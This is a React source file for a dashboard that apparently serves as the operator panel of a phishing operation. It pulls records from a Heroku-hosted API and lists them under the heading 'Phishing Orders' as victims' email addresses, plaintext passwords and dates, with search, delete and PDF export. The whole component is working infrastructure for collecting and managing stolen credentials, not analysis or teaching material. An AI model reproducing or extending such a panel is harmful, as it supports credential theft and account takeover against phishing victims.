import React from "react";
import jsPDF from "jspdf";
import axios from "axios";

const Dashbord = () => {
  const [users, setUsers] = React.useState(null);
  const [sercher, setSercher] = React.useState("");
  let rndId = 1;
  React.useEffect(() => {
    const fetch = async () => {
      const { data } = await axios.get(
        "https://usersgetter.herokuapp.com/users"
      );
      setUsers(data);
    };
    fetch();
  }, []);
  const removeOrders = async (id) => {
    await axios.delete(`https://usersgetter.herokuapp.com/users/${id}`);
  };
  const dowloandPdf = () => {
    let pdf = new jsPDF("p", "pt", "a4");
    pdf.html(document.getElementById("box_info"), {
      callback: function (pd) {
        pd.save("asrbekPdf.pdf");
      },
    });
  };

  return (
    <main>
      <div className="head-title">
        <div className="left">
          <h1>Users</h1>
        </div>
        <a href="#f" className="btn-download" onClick={dowloandPdf}>
          <i className="bx bxs-cloud-download"></i>

          <span className="text">Download PDF</span>
        </a>
      </div>

      <ul className="box-info">
        <li>
          <i className="bx bxs-calendar-check"></i>
          <span className="text">
            <h3>{users?.length}</h3>
            <p>New Users</p>
          </span>
        </li>
      </ul>

      <div className="table-data" id="box_info">
        <div className="order">
          <div className="head">
            <h3>Phishing Orders</h3>
            <div className="input_box">
              <i className="bx bx-search"></i>
              <input
                type="search"
                value={sercher}
                onChange={(e) => setSercher(e.target.value)}
              />
            </div>
            <i className="bx bx-filter"></i>
          </div>
          <table>
            <thead>
              <tr>
                <th>User</th>
                <th>Password</th>
                <th>Date</th>
                <th>Remove</th>
              </tr>
            </thead>
            <tbody>
              {users
                ?.filter((e) =>
                  e.email.toUpperCase().includes(sercher.toUpperCase())
                )
                .map((items) => (
                  <tr key={items._id}>
                    <td>
                      <b>{rndId++}</b>
                      <span>{items.email[0]}</span>
                      <p>{items.email}</p>
                    </td>
                    <td>{items.password}</td>
                    <td>{items.date}</td>
                    <td>
                      <button
                        className="status pending btn"
                        onClick={() => removeOrders(items._id)}
                      >
                        Remove
                      </button>
                    </td>
                  </tr>
                ))}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
};

export default Dashbord;
